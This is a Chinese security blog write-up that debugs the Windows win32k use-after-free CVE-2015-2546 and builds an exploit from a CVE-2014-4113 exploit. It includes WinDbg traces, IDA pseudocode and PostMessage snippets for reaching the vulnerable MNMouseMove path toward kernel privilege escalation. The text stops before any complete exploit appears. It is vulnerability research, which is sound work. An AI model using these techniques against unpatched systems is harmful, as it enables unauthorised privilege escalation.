<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>经典内核漏洞调试笔记之二</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">经典内核漏洞调试笔记之二</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2016-11-15" class="timeago">10 月，1 周 之前</time>
          <time datetime="2016-11-15" class="fulldate">十一月 15, 2016</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/bin-security/">二进制安全</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p>本文来源：<a href="http://bobao.360.cn/learning/detail/3184.html">安全客</a></p>
<p>作者：k0pwn_ko</p>
<p>上篇回顾：http://paper.seebug.org/102/</p>
<h3>前言</h3>
<p>上一次我发了一篇自己在一个经典内核漏洞CVE-2014-4113中挣扎的经历，以及一些调试细节的分享：
<a href="http://paper.seebug.org/102/">经典内核漏洞调试笔记</a> 
（原文链接：http://bobao.360.cn/learning/detail/3170.html）</p>
<p>总结过后感觉自己收获很多，后来一个偶然的机会，我看到了百度安全实验室发的<a href="http://xlab.baidu.com/cve-2015-2546%ef%bc%9a%e4%bb%8e%e8%a1%a5%e4%b8%81%e6%af%94%e5%af%b9%e5%88%b0exploit/">一篇文章</a>，是关于另一个经典的内核漏洞，也就是今天的主角----CVE-2015-2546这个漏洞的从补丁对比到Exploit的分析</p>
<p>同样感觉收获满满，在这篇分析中，总结了漏洞的成因，以及构造还原的手法，受益匪浅，但是并没有提供Exploit，于是根据这篇分析，我尝试编写了一下Exploit，这一次真的是非常艰辛，一边逆向调试，一边编写Exploit，磕磕绊绊完成了这个漏洞的利用，但和我的上一篇分析一样，在调试过程中，有好多非常有意思的过程，所以总结了一下，拿出来和大家一起分享。</p>
<p>下面开始我这只小菜鸟的提权之旅。</p>
<h3>从CVE-2014-4113到CVE-2015-2546</h3>
<p>首先我来描述一下这个漏洞的过程：在创建弹出菜单之后，当进行鼠标操作的时候会触发鼠标事件，引发win32k.sys下的一个叫做MNMouseMove的函数，在这个函数的处理过程中会涉及到一个叫做MNHideNextHierarchy的函数，这个函数会传入一个参数，这个参数是一个名为tagPOPUPMENU的结构体对象，由于对于这个对象没有进行检查，导致可以通过前面的SendMessage异步的方法，使用将这个对象释放掉，然后使用一个fake_tag进行占位，从而将这个fake_tag传入MNHideNextHierarchy，在这个函数中会处理一个1E4消息，在这里由于fake_tag的关系，导致释放后重用，从而引发在Ring0层执行Shellcode，最后完成提权。</p>
<p>第一次看到这个漏洞的时候，我就觉得这个利用的过程和CVE-2014-4113非常相像，都是在SendMessage中完成的利用，也就是利用的call [esi+60h]这个汇编指令。</p>
<p>要想触发这个漏洞，首先要想办法执行到MNMouseMove，我们一起来分析一下从哪里能够执行到MNMouseMove。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2016/11/t011ce5e5cc8cb4623e.png-w331s" /></p>
<p>这个过程是不是非常熟悉，从TrackPopupMenuEx到MNLoop，到HandleMenuMessages，最后到MNMouseMove。我们上一篇调试CVE-2014-4113就是这个过程，上一个漏洞发生在HandleMenuMessage中，而CVE-2015-2546发生在HandleMenuMessages里面的另一个调用，那么我就产生了一个想法，CVE-2014-4113的Exploit我们是否能在这个漏洞里使用呢？（事后证明，想的容易，做起来难，不过过程很有意思。）我们就从CVE-2014-4113这个Exploit入手，来完成CVE-2015-2546的提权。</p>
<h3>和内核对抗的日子</h3>
<p>首先我们来看一下CVE-2014-4113和CVE-2015-2546有多少关系，相关内容，可以看一下注释。</p>
<div class="codehilite"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&gt;</span> <span class="mh">0x104</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&gt;</span> <span class="mh">0x202</span> <span class="p">)</span>
    <span class="p">{</span>
     <span class="err">……</span>
    <span class="p">}</span>
    <span class="err">……</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v20</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v21</span> <span class="o">=</span> <span class="n">v20</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v21</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="err">……</span>
            <span class="n">v13</span> <span class="o">=</span> <span class="n">xxxMNFindWindowFromPoint</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">UnicodeString</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v7</span><span class="p">);</span>
            <span class="n">v52</span> <span class="o">=</span> <span class="n">IsMFMWFPWindow</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span> <span class="n">v52</span> <span class="p">)</span>
        <span class="err">……</span>
            <span class="k">if</span> <span class="p">(</span> <span class="n">v13</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
              <span class="n">xxxMNButtonDown</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">v3</span><span class="p">,</span> <span class="n">v12</span><span class="p">,</span> <span class="n">UnicodeString</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
            <span class="k">else</span>
              <span class="nf">xxxSendMessage</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">v13</span><span class="p">,</span> <span class="o">-</span><span class="mi">19</span><span class="p">,</span> <span class="n">UnicodeString</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">// CVE -2014-4113的漏洞位置</span>
            <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v12</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x100</span><span class="p">)</span> <span class="p">)</span>
              <span class="n">xxxMNRemoveMessage</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">),</span> <span class="mi">516</span><span class="p">);</span>
          <span class="p">}</span>
          <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">goto</span> <span class="n">LABEL_59</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="err">……</span>
<span class="nl">LABEL_59</span><span class="p">:</span>
    <span class="err">……</span>
    <span class="n">xxxMNMouseMove</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v7</span><span class="p">);</span> <span class="c1">// CVE-2015-2546漏洞位置</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>


<p>可以看到，两个漏洞的位置都处于HandleMenuMessages的函数中，经过CVE-2014-4113的分析，我们发现这个过程需要通过调用PostMessage的函数，这涉及到对窗口的操作，在CVE-2014-4113中，通过WNDCLASS类中的lpfnWndProc定义了回调函数MyWndProc负责处理窗口函数，这里使用的PostMessage的方法。</p>
<p>这样的话，为了使程序执行到MNMouseMove，我需要设定一个鼠标事件，这里的灵感来源于百度实验室的分析文章，所以我考虑使用。</p>
<div class="codehilite"><pre><span></span><span class="c1">//WM_SYSCOMMAND处理消息</span>
<span class="n">PostMessage</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span><span class="n">WM_SYSCOMMAND</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="c1">//发送WM_SYSCOMMAND</span>
<span class="c1">//鼠标事件</span>
<span class="n">PostMessage</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span><span class="n">WM_LBUTTONDOWN</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="c1">//鼠标左键按下</span>
<span class="n">PostMessage</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span><span class="n">WM_LBUTTONUP</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="c1">//鼠标左键抬起</span>
</pre></div>


<p>但是经过调试，我发现无论如何也到达不了调试位置，这样我需要考虑为何无法到达调试位置，在分析的过程中发现了一个有趣的事情，首先，在CVE-2014-4113中，使用TrackPopupMenu会创建一个弹出窗口菜单。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2016/11/t01d57c3ebdd5ccf0e1.png-w331s" /></p>
<p>但是，当修改了MyWndProc变成我们设定的事件之后，窗口菜单弹出后就没有后续动作了，也就是说，没有进入MNMouseMove的处理过程，但是当我把鼠标挪到上图的菜单中时，我们首先命中了HandleMenuMessages断点，紧接着命中了MNMouseMove。</p>
<div class="codehilite"><pre><span></span>kd&gt; g
Breakpoint <span class="m">6</span> hit
win32k!xxxHandleMenuMessages:
90668d78 8bff            mov     edi,edi
kd&gt; g
Breakpoint <span class="m">4</span> hit
win32k!xxxMNMouseMove:
906693ef 8bff            mov     edi,edi
</pre></div>


<p>这说明在鼠标挪上去后在HandleMenuMessages中发生的事情能够使程序最后进入MNMouseMove，分析一下这个过程。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxHandleMenuMessages+0x1b:
90668d93 8b7508          mov     esi,dword ptr <span class="o">[</span>ebp+8<span class="o">]</span>
kd&gt; p
win32k!xxxHandleMenuMessages+0x1e:
90668d96 8b4604          mov     eax,dword ptr <span class="o">[</span>esi+4<span class="o">]</span>
kd&gt; p
win32k!xxxHandleMenuMessages+0x21:
90668d99 8b5608          mov     edx,dword ptr <span class="o">[</span>esi+8<span class="o">]</span>
kd&gt; r eax
<span class="nv">eax</span><span class="o">=</span><span class="m">00000200</span>
</pre></div>


<p>可以发现，程序进入后，会传递一个值0x200，这个值会在随后的过程中连续传递并且判断并且跳转，这个过程不再详细跟踪，举两个跳转的例子。</p>
<div class="codehilite"><pre><span></span>//一处跳转，0x200和0x104作比较
kd&gt; p
win32k!xxxHandleMenuMessages+0x2f:
90668da7 895dfc          mov     dword ptr <span class="o">[</span>ebp-4<span class="o">]</span>,ebx
kd&gt; p
win32k!xxxHandleMenuMessages+0x32:
90668daa 3bc1            cmp     eax,ecx
kd&gt; r eax
<span class="nv">eax</span><span class="o">=</span><span class="m">00000200</span>
kd&gt; r ecx
<span class="nv">ecx</span><span class="o">=</span><span class="m">00000104</span>
kd&gt; p
win32k!xxxHandleMenuMessages+0x34:
90668dac 0f87e4010000    ja      win32k!xxxHandleMenuMessages+0x21d <span class="o">(</span>90668f96<span class="o">)</span>
//另一处跳转，0x200和0x202作比较
kd&gt; p
win32k!xxxHandleMenuMessages+0x21d:
90668f96 b902020000      mov     ecx,202h
kd&gt; p
win32k!xxxHandleMenuMessages+0x222:
90668f9b 3bc1            cmp     eax,ecx
kd&gt; p
win32k!xxxHandleMenuMessages+0x224:
90668f9d 0f8706010000    ja      win32k!xxxHandleMenuMessages+0x330 <span class="o">(</span>906690a9<span class="o">)</span>
</pre></div>


<p>这时我们看一下我这篇文章开头提到的HandleMenuMessages函数的分析，在开头有两处if语句判断，正是和这两个值做的比较，接下来经过一系列判断跳转之后，我们就到达了MNMouseMove的调用。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxHandleMenuMessages+0x264:
90668fdd a900040000      <span class="nb">test</span>    eax,400h
kd&gt; p
win32k!xxxHandleMenuMessages+0x269:
90668fe2 747a            je      win32k!xxxHandleMenuMessages+0x2e5 <span class="o">(</span>9066905e<span class="o">)</span>
kd&gt; p
win32k!xxxHandleMenuMessages+0x2e5:
9066905e <span class="m">53</span>              push    ebx
</pre></div>


<p>9066905e地址所处的位置，已经是MNMouseMove的上方，ebx正在作为MNMouseMove的参数传入栈中。</p>
<div class="codehilite"><pre><span></span>.text:BF93905E <span class="p">;</span> <span class="m">395</span>:     xxxMNMouseMove<span class="o">(</span>v3, a2, <span class="o">(</span>int<span class="o">)</span>v7<span class="o">)</span><span class="p">;</span>
.text:BF93905E                 push    ebx             <span class="p">;</span> int
.text:BF93905F                 push    esi             <span class="p">;</span> int
.text:BF939060                 push    edi             <span class="p">;</span> UnicodeString
.text:BF939061                 call    _xxxMNMouseMove@12 <span class="p">;</span> xxxMNMouseMove<span class="o">(</span>x,x,x<span class="o">)</span>
</pre></div>


<p>也就是说，之前传入的这个eax是一个很关键的值，如果弄明白这个值，就可以让程序成功执行到MNMouseMove了，但因为这个过程实际上是通过Windows下的图形界面操作（也就是鼠标在我们创建的主窗口移动产生的），所以我们并不能通过CVE-2014-4113的源码分析出来，这里需要分析一下这个值得内容，这时我想到了CVE-2014-4113源程序，同样也是在HandleMenuMessages进行if语句的判断导致跳转，而CVE-2014-4113已经分析的很清楚了，运行CVE-2014-4113的源程序，中断在HandleMenuMessage调试。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxHandleMenuMessages+0x19:
90668d91 <span class="m">53</span>              push    ebx
kd&gt; p
win32k!xxxHandleMenuMessages+0x1a:
90668d92 <span class="m">56</span>              push    esi
kd&gt; p
win32k!xxxHandleMenuMessages+0x1b:
90668d93 8b7508          mov     esi,dword ptr <span class="o">[</span>ebp+8<span class="o">]</span>
kd&gt; p
win32k!xxxHandleMenuMessages+0x1e:
90668d96 8b4604          mov     eax,dword ptr <span class="o">[</span>esi+4<span class="o">]</span>
kd&gt; p
win32k!xxxHandleMenuMessages+0x21:
90668d99 8b5608          mov     edx,dword ptr <span class="o">[</span>esi+8<span class="o">]</span>
kd&gt; r eax
<span class="nv">eax</span><span class="o">=</span><span class="m">00000201</span>
kd&gt; dd esi
85c4bb0c  000f02a2 <span class="m">00000201</span> <span class="m">00000000</span> <span class="m">00000000</span>
</pre></div>


<p>可以看到这里eax的值是0x201（刚才那个是0x200），也就是十进制的513，来看一下CVE-2014-4113里的过程，计算一下。</p>
<div class="codehilite"><pre><span></span> <span class="n">v20</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">-</span> <span class="mi">261</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v20</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v21</span> <span class="o">=</span> <span class="n">v20</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v21</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">v22</span> <span class="o">=</span> <span class="n">v21</span> <span class="o">-</span> <span class="mi">18</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v22</span> <span class="p">)</span>
          <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">v23</span> <span class="o">=</span> <span class="n">v22</span> <span class="o">-</span> <span class="mi">232</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">v23</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span> <span class="n">v23</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
          <span class="p">{</span>
<span class="nl">LABEL_13</span><span class="p">:</span>
            <span class="n">v12</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
            <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
            <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">v7</span><span class="p">;</span>
            <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">SHIWORD</span><span class="p">(</span><span class="n">v7</span><span class="p">);</span>
            <span class="n">v13</span> <span class="o">=</span> <span class="n">xxxMNFindWindowFromPoint</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">UnicodeString</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v7</span><span class="p">);</span>
            <span class="n">v52</span> <span class="o">=</span> <span class="n">IsMFMWFPWindow</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
</pre></div>


<p>这里要计算最后v23的值，就从最上方v20的值开始向下判断，也就是v23=513-261-1-18-232=1，正好v23等于1，从而进入下面CVE-2014-4113的处理逻辑。v5的值，就是0x201，也就是513，那么这个值到底是什么呢，我们来查一下这个值。</p>
<div class="codehilite"><pre><span></span><span class="n">public</span> <span class="k">enum</span> <span class="nl">WMessages</span> <span class="p">:</span> <span class="kt">int</span>
   <span class="p">{</span>
       <span class="n">WM_LBUTTONDOWN</span> <span class="o">=</span> <span class="mh">0x201</span><span class="p">,</span> <span class="c1">//Left mousebutton down</span>
       <span class="n">WM_LBUTTONUP</span> <span class="o">=</span> <span class="mh">0x202</span><span class="p">,</span>  <span class="c1">//Left mousebutton up</span>
       <span class="n">WM_LBUTTONDBLCLK</span> <span class="o">=</span> <span class="mh">0x203</span><span class="p">,</span> <span class="c1">//Left mousebutton doubleclick</span>
       <span class="n">WM_RBUTTONDOWN</span> <span class="o">=</span> <span class="mh">0x204</span><span class="p">,</span> <span class="c1">//Right mousebutton down</span>
       <span class="n">WM_RBUTTONUP</span> <span class="o">=</span> <span class="mh">0x205</span><span class="p">,</span>   <span class="c1">//Right mousebutton up</span>
       <span class="n">WM_RBUTTONDBLCLK</span> <span class="o">=</span> <span class="mh">0x206</span><span class="p">,</span> <span class="c1">//Right mousebutton doubleclick</span>
       <span class="n">WM_KEYDOWN</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">,</span>  <span class="c1">//Key down</span>
       <span class="n">WM_KEYUP</span> <span class="o">=</span> <span class="mh">0x101</span><span class="p">,</span>   <span class="c1">//Key up</span>
   <span class="p">}</span>
</pre></div>


<p>原来这个值就是WM_LBUTTONDOWN的值，正是CVE-2014-4113利用程序中MyWndProc中其中第三个PostMessage中调用到的第二个参数值，所以，我在这里，将我的Exploit中的PostMessage里第二个参数直接修改成0x200，重新运行程序，终于命中了MNMouseMove断点。接下来可以进入内层函数分析了。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2016/11/t01355e5760e1e993b2.png-w331s" /></p>
<p>原来这个值就是WM_LBUTTONDOWN的值，正是CVE-2014-4113利用程序中MyWndProc中其中第三个PostMessage中调用到的第二个参数值，所以，我在这里，将我的Exploit中的PostMessage里第二个参数直接修改成0x200，重新运行程序，终于命中了MNMouseMove断点。接下来可以进入内层函数分析了。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxMNMouseMove+0x2f:
9066941e 0f846f010000    je      win32k!xxxMNMouseMove+0x1a4 <span class="o">(</span><span class="m">90669593</span><span class="o">)</span>
kd&gt; p
win32k!xxxMNMouseMove+0x1a4:
<span class="m">90669593</span> 5f              pop     edi
</pre></div>


<p>来看一下IDA pro的伪代码。</p>
<div class="codehilite"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">signed</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">a3</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">||</span> <span class="n">SHIWORD</span><span class="p">(</span><span class="n">a3</span><span class="p">)</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
</pre></div>


<p>只有上面伪代码中的if语句判断通过后，才能进入到漏洞的处理流程，动态跟踪一下这个过程。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxMNMouseMove+0x26:
<span class="m">90669415</span> c1ea10          shr     edx,10h
kd&gt; r edx
<span class="nv">edx</span><span class="o">=</span><span class="m">00000000</span>
kd&gt; p
win32k!xxxMNMouseMove+0x29:
<span class="m">90669418</span> 0fbfd2          movsx   edx,dx
kd&gt; r edx
<span class="nv">edx</span><span class="o">=</span><span class="m">00000000</span>
kd&gt; p
win32k!xxxMNMouseMove+0x2c:
9066941b 3b570c          cmp     edx,dword ptr <span class="o">[</span>edi+0Ch<span class="o">]</span>
</pre></div>


<p>这最主要的原因就是对比的两个值都为0，从而不满足if语句的跳转，跳过了漏洞处理所需的逻辑流程，但是在我们利用鼠标移动的时候，却发现这个流程可以进入if语句判断。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxHandleMenuMessages+0x2e8:
<span class="m">90669061</span> e889030000      call    win32k!xxxMNMouseMove <span class="o">(</span>906693ef<span class="o">)</span>
kd&gt; dd esp
85c47a98  fde8da68 9074f580 000f0059 9074f580 //000f0059
kd&gt; p
win32k!xxxMNMouseMove+0x18:
<span class="m">90669407</span> 0fbfc1          movsx   eax,cx
kd&gt; r ecx
<span class="nv">ecx</span><span class="o">=</span>000f0059
kd&gt; p
win32k!xxxMNMouseMove+0x1b:
9066940a <span class="m">57</span>              push    edi
kd&gt; p
win32k!xxxMNMouseMove+0x1c:
9066940b 8b7d0c          mov     edi,dword ptr <span class="o">[</span>ebp+0Ch<span class="o">]</span>
kd&gt; p
win32k!xxxMNMouseMove+0x1f:
9066940e 3b4708          cmp     eax,dword ptr <span class="o">[</span>edi+8<span class="o">]</span>
kd&gt; p
win32k!xxxMNMouseMove+0x22:
<span class="m">90669411</span> <span class="m">7511</span>            jne     win32k!xxxMNMouseMove+0x35 <span class="o">(</span><span class="m">90669424</span><span class="o">)</span>
kd&gt; p
win32k!xxxMNMouseMove+0x35:
<span class="m">90669424</span> <span class="m">894708</span>          mov     dword ptr <span class="o">[</span>edi+8<span class="o">]</span>,eax
kd&gt; r eax
<span class="nv">eax</span><span class="o">=</span><span class="m">00000059</span>
</pre></div>


<p>鼠标移动的情况下，eax的值是0x59，并非0x00，那么这个值从哪里来呢，在进入MNMouseMove前看一下参数。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxHandleMenuMessages+0x2e8:
<span class="m">90669061</span> e889030000      call    win32k!xxxMNMouseMove <span class="o">(</span>906693ef<span class="o">)</span>
kd&gt; dd esp
85c47a98  fde8da68 9074f580 000f0059 9074f580
</pre></div>


<p>通过IDA pro分析一下HandleMenuMessages函数，看看这个值是从哪里来。</p>
<div class="codehilite"><pre><span></span><span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
<span class="n">v6</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
<span class="n">v7</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
<span class="n">xxxMNMouseMove</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v7</span><span class="p">);</span>
</pre></div>


<p>是a1，也就是HandleMenuMessages的第一个参数，这样我们可以回到CVE-2014-4113中，在调用HandleMenuMessages的时候，直接查看第一个参数偏移+0Ch位置的值，看看这个值是不是由我们决定的。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxHandleMenuMessages+0x1e:
90668d96 8b4604          mov     eax,dword ptr <span class="o">[</span>esi+4<span class="o">]</span>
kd&gt; p
win32k!xxxHandleMenuMessages+0x21:
90668d99 8b5608          mov     edx,dword ptr <span class="o">[</span>esi+8<span class="o">]</span>
kd&gt; p
win32k!xxxHandleMenuMessages+0x24:
90668d9c 8b5e0c          mov     ebx,dword ptr <span class="o">[</span>esi+0Ch<span class="o">]</span>
kd&gt; r edx
<span class="nv">edx</span><span class="o">=</span><span class="m">00000000</span>
kd&gt; p
win32k!xxxHandleMenuMessages+0x27:
90668d9f b904010000      mov     ecx,104h
kd&gt; r ebx
<span class="nv">ebx</span><span class="o">=</span><span class="m">00000000</span>
kd&gt; r eax
<span class="nv">eax</span><span class="o">=</span><span class="m">00000201</span>
</pre></div>


<p>可以看到ebx寄存器是esi+0ch的值，这个值是0，eax的值是0x201，回过头看一下正常Exploit中MyWndProc函数的PostMessages的参数调用。</p>
<div class="codehilite"><pre><span></span><span class="n">PostMessage</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span><span class="n">WM_LBUTTONDOWN</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
</pre></div>


